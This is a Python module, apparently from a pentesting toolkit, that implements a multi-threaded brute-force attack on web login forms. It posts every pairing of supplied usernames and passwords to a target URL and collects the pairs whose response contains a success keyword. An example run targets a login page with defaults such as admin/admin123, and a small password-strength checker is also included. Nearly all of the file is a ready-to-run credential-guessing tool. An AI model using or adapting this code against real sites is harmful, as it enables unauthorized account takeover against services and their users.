"""
modules/pentesting_tools/brute_force_tools.py

This module provides tools for brute-forcing login credentials and testing password strength.
Features include dictionary attacks, credential testing, and multi-threaded brute force operations.
"""

import requests
import threading
from queue import Queue


class BruteForceTool:
    """
    A tool for performing brute-force attacks on login forms and testing password strength.
    """

    def __init__(self, max_threads=10):
        self.max_threads = max_threads
        self.queue = Queue()

    def load_credentials(self, usernames, passwords):
        """
        Loads usernames and passwords into a queue for brute force attempts.
        :param usernames: List of usernames to test.
        :param passwords: List of passwords to test.
        """
        for username in usernames:
            for password in passwords:
                self.queue.put((username, password))

    def brute_force(self, url, username_field="username", password_field="password", success_keyword=None):
        """
        Executes a brute-force attack on the specified login URL.
        :param url: Target login URL.
        :param username_field: Field name for username in the form.
        :param password_field: Field name for password in the form.
        :param success_keyword: Keyword indicating a successful login in the response.
        :return: List of successful credentials.
        """
        successful_attempts = []

        def worker():
            while not self.queue.empty():
                username, password = self.queue.get()
                try:
                    print(f"Trying: {username} / {password}")
                    response = requests.post(url, data={username_field: username, password_field: password})
                    if success_keyword and success_keyword in response.text:
                        print(f"Success: {username} / {password}")
                        successful_attempts.append((username, password))
                except Exception as e:
                    print(f"Error for {username} / {password}: {e}")
                finally:
                    self.queue.task_done()

        threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=worker)
            thread.start()
            threads.append(thread)

        self.queue.join()

        for thread in threads:
            thread.join()

        return successful_attempts

    @staticmethod
    def test_password_strength(password):
        """
        Tests the strength of a given password based on common criteria.
        :param password: Password to test.
        :return: Dictionary with strength metrics.
        """
        metrics = {
            "length": len(password) >= 12,
            "uppercase": any(char.isupper() for char in password),
            "lowercase": any(char.islower() for char in password),
            "numbers": any(char.isdigit() for char in password),
            "special_characters": any(char in "!@#$%^&*()-_=+[]{};:'\",.<>?/\\|`~" for char in password),
        }
        metrics["strong"] = all(metrics.values())
        return metrics


if __name__ == "__main__":
    # Example Usage

    # Brute force attack
    usernames = ["admin", "user", "test"]
    passwords = ["123456", "password", "admin123"]
    url = "https://example.com/login"

    brute_force_tool = BruteForceTool(max_threads=5)
    brute_force_tool.load_credentials(usernames, passwords)

    print("Starting brute force attack...")
    results = brute_force_tool.brute_force(url, success_keyword="Welcome")
    print("Successful attempts:", results)

    # Test password strength
    test_password = "Admin@123"
    strength_metrics = brute_force_tool.test_password_strength(test_password)
    print(f"Password strength for '{test_password}': {strength_metrics}")
